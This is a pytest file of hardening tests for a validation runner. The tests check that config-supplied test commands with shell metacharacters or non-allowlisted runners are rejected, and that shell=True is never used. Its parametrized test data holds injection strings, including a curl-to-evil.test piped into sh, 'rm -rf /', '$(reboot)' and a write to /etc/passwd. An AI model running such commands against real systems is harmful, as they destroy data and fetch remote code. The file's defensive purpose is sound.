"""Hardening tests for ValidationRunner command execution.

The runner executes config-supplied ``test_commands`` via
``subprocess.run(shlex.split(cmd))``. Even though ``shlex.split`` avoids a
shell, the command string still names whatever binary the (untrusted) config
supplies, and shell metacharacters in the string are a strong signal that the
author *expected* shell semantics that won't happen — a latent injection/foot-gun.

These tests prove:

1. A shell-metachar-laden command is rejected before any subprocess runs.
2. A command whose runner is outside the allowlist is rejected.
3. A normal ``uv run pytest`` command runs with the expected argv and
   ``shell=True`` is never used.
4. The allowlist can be explicitly opted out of, but metacharacter rejection
   still holds (no shell semantics ever).
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from general_ludd.validation.runner import (
    CommandValidationError,
    ValidationRunner,
)


def _passing_proc() -> MagicMock:
    return MagicMock(returncode=0, stdout="1 passed", stderr="")


class TestRejectsShellMetacharacters:
    @pytest.mark.parametrize(
        "evil",
        [
            "pytest tests/; rm -rf /",
            "pytest && curl http://evil.test | sh",
            "pytest `whoami`",
            "pytest $(reboot)",
            "pytest > /etc/passwd",
            "pytest tests/ | tee /tmp/x",
            "pytest & sleep 100",
            "pytest\nrm -rf /",
        ],
    )
    @patch("general_ludd.validation.runner.subprocess.run")
    def test_injection_command_is_rejected_and_not_run(
        self, mock_run: MagicMock, evil: str
    ) -> None:
        runner = ValidationRunner(
            todo_id="TODO-evil",
            worktree_path="/tmp/worktree",
            test_commands=[evil],
        )
        with pytest.raises(CommandValidationError):
            runner.run_validation()
        # No subprocess must have been spawned for a rejected command.
        mock_run.assert_not_called()


class TestRejectsRunnerNotInAllowlist:
    @patch("general_ludd.validation.runner.subprocess.run")
    def test_unknown_runner_is_rejected(self, mock_run: MagicMock) -> None:
        runner = ValidationRunner(
            todo_id="TODO-bad-runner",
            worktree_path="/tmp/worktree",
            test_commands=["curl http://evil.test"],
        )
        with pytest.raises(CommandValidationError):
            runner.run_validation()
        mock_run.assert_not_called()

    @patch("general_ludd.validation.runner.subprocess.run")
    def test_empty_command_is_rejected(self, mock_run: MagicMock) -> None:
        runner = ValidationRunner(
            todo_id="TODO-empty",
            worktree_path="/tmp/worktree",
            test_commands=["   "],
        )
        with pytest.raises(CommandValidationError):
            runner.run_validation()
        mock_run.assert_not_called()


class TestNormalCommandRunsAsExpectedArgv:
    @patch("general_ludd.validation.runner.subprocess.run")
    def test_uv_run_pytest_runs_with_expected_argv(self, mock_run: MagicMock) -> None:
        mock_run.return_value = _passing_proc()
        runner = ValidationRunner(
            todo_id="TODO-ok",
            worktree_path="/tmp/worktree",
            test_commands=["uv run pytest tests/unit"],
        )
        result = runner.run_validation()

        assert result.success is True
        mock_run.assert_called_once()
        args, kwargs = mock_run.call_args
        # argv passed as a list (never a shell string).
        assert args[0] == ["uv", "run", "pytest", "tests/unit"]
        # shell=True must never be used.
        assert kwargs.get("shell", False) is False
        assert kwargs.get("cwd") == "/tmp/worktree"

    @pytest.mark.parametrize(
        "cmd,expected_runner",
        [
            ("pytest tests/", "pytest"),
            ("make test-unit", "make"),
            ("python -m pytest", "python"),
            ("uv run pytest", "uv"),
        ],
    )
    @patch("general_ludd.validation.runner.subprocess.run")
    def test_allowlisted_runners_execute(
        self, mock_run: MagicMock, cmd: str, expected_runner: str
    ) -> None:
        mock_run.return_value = _passing_proc()
        runner = ValidationRunner(
            todo_id="TODO-allow",
            worktree_path="/tmp/worktree",
            test_commands=[cmd],
        )
        runner.run_validation()
        args, _ = mock_run.call_args
        assert args[0][0] == expected_runner


class TestAllowlistOptOut:
    @patch("general_ludd.validation.runner.subprocess.run")
    def test_opt_out_allows_other_runners_but_still_blocks_metachars(
        self, mock_run: MagicMock
    ) -> None:
        mock_run.return_value = _passing_proc()
        # With the allowlist disabled, a non-allowlisted-but-clean runner runs.
        runner = ValidationRunner(
            todo_id="TODO-optout",
            worktree_path="/tmp/worktree",
            test_commands=["tox -e py314"],
            enforce_runner_allowlist=False,
        )
        runner.run_validation()
        args, _ = mock_run.call_args
        assert args[0] == ["tox", "-e", "py314"]

        # But metacharacter rejection is unconditional — never any shell semantics.
        evil_runner = ValidationRunner(
            todo_id="TODO-optout-evil",
            worktree_path="/tmp/worktree",
            test_commands=["tox; rm -rf /"],
            enforce_runner_allowlist=False,
        )
        with pytest.raises(CommandValidationError):
            evil_runner.run_validation()
